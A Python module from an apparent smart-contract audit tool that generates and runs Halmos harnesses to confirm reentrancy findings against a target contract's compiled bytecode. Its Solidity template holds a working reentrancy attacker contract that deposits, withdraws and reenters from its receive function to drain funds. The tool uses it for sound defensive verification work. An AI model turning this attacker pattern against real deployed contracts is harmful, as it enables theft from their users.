"""Per-contract Halmos verification for SOL-001 (pipeline branching).

Until now Halmos only ran on isolated versioned harnesses, so real
audit findings never became PROVEN. This module generates a harness
*from the actual finding*: the target source is compiled as-is and an
attacker/test harness is generated around the vulnerable function
(credit function + withdraw function detected from the source).

Why bytecode deployment (vm.getCode) and not a direct import — do not
"simplify" this back to an import, it breaks on real corpora:
1. solc refuses mixed-version import graphs: a 0.8 harness cannot
   `import` a `^0.4.2` target ("Found incompatible versions"), and the
   target must be compiled with its own pragma to be the real code.
2. Pre-0.8 `assert` compiles to the INVALID opcode (0xfe). Halmos
   cannot read that as a property violation (it surfaces as an engine
   error / all-paths-reverted), so a same-pragma harness can drain a
   vault concretely and still report nothing usable.
Deploying the target's own compiled artifact via
``vm.getCode("Target.sol:<Contract>")`` + CREATE inside a 0.8 harness
avoids both: the target is the real bytecode, the assertions are
0.8 Panic-style that Halmos reports as counterexamples. Verified on
SmartBugs `simple_dao.sol` (^0.4.2): direct harness = engine error,
bytecode harness = concrete reentrancy counterexample.

Outcomes are honest:

- Halmos counterexample -> PROVEN with a halmos_counterexample witness
- no counterexample in bounds -> stays DETECTED_UNPROVEN
- uncompilable / unsupported shape / timeout -> UNKNOWN with reason

The harness is generated per audit in a temp project (the versioned
category harnesses under harnesses/ remain the reference templates).
"""
from __future__ import annotations

import json
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Optional

try:
    from modules.solidity.function_parser import parse_source
    from modules.halmos.runner import halmos_available
except (ImportError, ValueError):
    import sys
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
    from modules.solidity.function_parser import parse_source  # type: ignore
    from modules.halmos.runner import halmos_available  # type: ignore


def _pragma_family(source: str) -> str:
    m = re.search(r"pragma\s+solidity\s+[^;]*?0\.(\d+)\.", source or "")
    minor = int(m.group(1)) if m else 8
    if minor <= 4:
        return "0.4"
    if minor <= 7:
        return "0.5"
    return "0.8"


def _detect_credit_function(functions, lines) -> Optional[dict]:
    """Function that credits a balance mapping from msg.value.

    Old contracts often omit `payable` in the parsed header or credit
    through a payable fallback; both shapes are accepted when the body
    provably records msg.value into a mapping. ``param_kind`` drives
    the generated call: address -> attacker, uint -> 0, none/fallback
    -> plain value call.
    """
    for fn in functions:
        if fn.kind not in ("function", "fallback"):
            continue
        body = "\n".join(lines[fn.body_start - 1:fn.end_line])
        if "msg.value" not in body:
            continue
        if not re.search(r"\w+\s*\[[^\]]*\]\s*\+?=", body):
            continue
        if fn.kind == "fallback":
            return {"name": "", "param_kind": "fallback"}
        if re.search(r"address\s+\w+", fn.header):
            return {"name": fn.name, "param_kind": "address"}
        if re.search(r"uint\w*\s+\w+", fn.header):
            return {"name": fn.name, "param_kind": "uint"}
        return {"name": fn.name, "param_kind": "none"}
    return None


def _render(family: str, contract_name: str, credit: dict, withdraw_name: str, withdraw_params: int) -> str:
    """Unified 0.8 harness deploying the target from its own artifact.

    Same-pragma import harnesses fail twice over on old targets: solc
    versions cannot be mixed in one import graph, and pre-0.8 `assert`
    compiles to INVALID, which Halmos cannot read as a violation.
    Deploying the compiled target via vm.getCode("Target.sol:Name")
    inside a 0.8 harness avoids both (verified on simple_dao 0.4).
    """
    kind = credit.get("param_kind", "none")
    if kind == "fallback":
        credit_call = 'target.call{value: amount}("")'
        victim_call = 'v.call{value: 500}("")'
    elif kind == "address":
        credit_call = f'target.call{{value: amount}}(abi.encodeWithSignature("{credit["name"]}(address)", address(this)))'
        victim_call = f'v.call{{value: 500}}(abi.encodeWithSignature("{credit["name"]}(address)", address(this)))'
    elif kind == "uint":
        credit_call = f'target.call{{value: amount}}(abi.encodeWithSignature("{credit["name"]}(uint256)", 0))'
        victim_call = f'v.call{{value: 500}}(abi.encodeWithSignature("{credit["name"]}(uint256)", 0))'
    else:
        credit_call = f'target.call{{value: amount}}(abi.encodeWithSignature("{credit["name"]}()"))'
        victim_call = f'v.call{{value: 500}}(abi.encodeWithSignature("{credit["name"]}()"))'
    withdraw_sig = f"{withdraw_name}(uint256)" if withdraw_params >= 1 else f"{withdraw_name}()"
    withdraw_args = "amount" if withdraw_params >= 1 else ""
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface VmCodePC {{ function getCode(string memory path) external returns (bytes memory); }}
contract AttackerPC {{
    address public target;
    uint256 public amount;
    constructor(address _t, uint256 _a) {{ target = _t; amount = _a; }}
    function attack() public payable {{
        (bool d, ) = {credit_call};
        require(d, "credit failed");
        (bool w, ) = target.call(abi.encodeWithSignature("{withdraw_sig}"{', ' + withdraw_args if withdraw_args else ''}));
        require(w, "withdraw failed");
    }}
    receive() external payable {{
        if (target.balance >= amount) {{
            (bool w, ) = target.call(abi.encodeWithSignature("{withdraw_sig}"{', ' + withdraw_args if withdraw_args else ''}));
            w;
        }}
    }}
}}
contract AdversumPerContractTest {{
    VmCodePC constant vm = VmCodePC(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function check_per_contract_no_drain() public {{
        bytes memory bytecode = vm.getCode("Target.sol:{contract_name}");
        address v;
        assembly {{ v := create(0, add(bytecode, 0x20), mload(bytecode)) }}
        require(v != address(0), "deploy failed");
        AttackerPC a = new AttackerPC(v, 100);
        (bool fv, ) = {victim_call};
        require(fv, "victim credit failed");
        a.attack{{value: 100}}();
        assert(address(a).balance <= 100);
    }}
}}
"""


def build_harness(source: str, finding: dict) -> Optional[dict]:
    """Generate a same-pragma Halmos harness for a SOL-001 finding."""
    lines, _contracts, functions = parse_source(source or "")
    fn_name = finding.get("function") or ""
    target_fn = next((f for f in functions if f.name == fn_name), None)
    if target_fn is None or not target_fn.contract:
        return None
    credit = _detect_credit_function(functions, lines)
    if credit is None:
        return None
    family = _pragma_family(source)
    return {
        "harness": _render(family, target_fn.contract, credit, fn_name, len(target_fn.params)),
        "contract": target_fn.contract,
        "check": "check_per_contract_no_drain",
        "credit_function": credit["name"],
        "withdraw_function": fn_name,
        "pragma_family": family,
    }


def run_per_contract(source: str, finding: dict, timeout: int = 180) -> dict:
    """Run Halmos on the actual contract source for a SOL-001 finding.

    Returns a verdict fragment (proof_verdict/witness/verdict_reason)
    plus the raw harness outcome under ``halmos``.
    """
    built = build_harness(source, finding)
    if built is None:
        return {"proof_verdict": "UNKNOWN", "witness": None,
                "verdict_reason": "Per-contract Halmos: no credit/withdraw pair located — cannot harness honestly.",
                "halmos": {"status": "unsupported_shape"}}
    bins = halmos_available()
    if not bins.get("halmos") or not bins.get("forge"):
        return {"proof_verdict": "UNKNOWN", "witness": None,
                "verdict_reason": "Per-contract Halmos unavailable (forge/halmos missing) — UNKNOWN, not safe.",
                "halmos": {"status": "unavailable"}}
    import os
    env = dict(os.environ)
    env["PATH"] = str(Path(bins["forge"]).parent) + os.pathsep + env.get("PATH", "")
    try:
        with tempfile.TemporaryDirectory(prefix="adversum-halmos-pc-") as tmp:
            root = Path(tmp)
            (root / "foundry.toml").write_text(
                '[profile.default]\nsrc = "src"\nout = "out"\nauto_detect_solc = true\n', encoding="utf-8")
            (root / "src").mkdir()
            (root / "src" / "Target.sol").write_text(source, encoding="utf-8")
            (root / "src" / "Harness.t.sol").write_text(built["harness"], encoding="utf-8")
            out_json = root / "halmos.json"
            try:
                proc = subprocess.run(
                    [bins["halmos"], "--root", str(root), "--contract", "AdversumPerContractTest",
                     "--json-output", str(out_json)],
                    capture_output=True, text=True, encoding="utf-8", errors="replace",
                    timeout=timeout, env=env)
            except subprocess.TimeoutExpired:
                return {"proof_verdict": "UNKNOWN", "witness": None,
                        "verdict_reason": f"Per-contract Halmos timeout ({timeout}s) — UNKNOWN, never safe.",
                        "halmos": {"status": "timeout"}}
            try:
                data = json.loads(out_json.read_text(encoding="utf-8"))
            except Exception:
                tail = (proc.stdout or "")[-400:]
                return {"proof_verdict": "UNKNOWN", "witness": None,
                        "verdict_reason": f"Per-contract Halmos failed to run (compile/tool error) — UNKNOWN. {tail[:200]}",
                        "halmos": {"status": "error", "stdout_tail": tail}}
            for _file, tests in (data.get("test_results") or {}).items():
                for test in tests:
                    if not test.get("name", "").startswith(built["check"]):
                        continue
                    if test.get("exitcode") == 1:
                        models = []
                        for m in test.get("models") or []:
                            models.append({str(v.get("variable_name") or k): v.get("value")
                                           for k, v in (m.get("model") or {}).items() if isinstance(v, dict)})
                        return {
                            "proof_verdict": "PROVEN",
                            "witness": {
                                "kind": "halmos_counterexample", "solver": "halmos (per-contract)",
                                "entry_point": built["withdraw_function"],
                                "call_path": [built["check"], f"{built['contract']}.{built['credit_function']}",
                                              f"{built['contract']}.{built['withdraw_function']} (reentered)"],
                                "counterexample": {"models": models, "contract": built["contract"]},
                                "scope": "Halmos bounded symbolic execution on the actual contract source "
                                         "with a generated attacker; whole-contract completeness not claimed.",
                                "artifact": "per-contract harness (temp project, generated from finding)",
                            },
                            "verdict_reason": "Halmos found a concrete reentrancy drain on the actual contract source.",
                            "halmos": {"status": "counterexample", "counterexample": models},
                        }
                    if test.get("exitcode") == 0:
                        return {"proof_verdict": "DETECTED_UNPROVEN", "witness": None,
                                "verdict_reason": "Per-contract Halmos found no drain within bounds — bounded absence, not proven safe.",
                                "halmos": {"status": "no_counterexample"}}
                    return {"proof_verdict": "UNKNOWN", "witness": None,
                            "verdict_reason": f"Per-contract Halmos engine error (exitcode {test.get('exitcode')}) — UNKNOWN, never safe.",
                            "halmos": {"status": "error"}}
    except Exception as exc:
        return {"proof_verdict": "UNKNOWN", "witness": None,
                "verdict_reason": f"Per-contract Halmos error: {type(exc).__name__}: {exc}",
                "halmos": {"status": "error"}}
    return {"proof_verdict": "UNKNOWN", "witness": None,
            "verdict_reason": "Per-contract Halmos produced no result — UNKNOWN.",
            "halmos": {"status": "error"}}
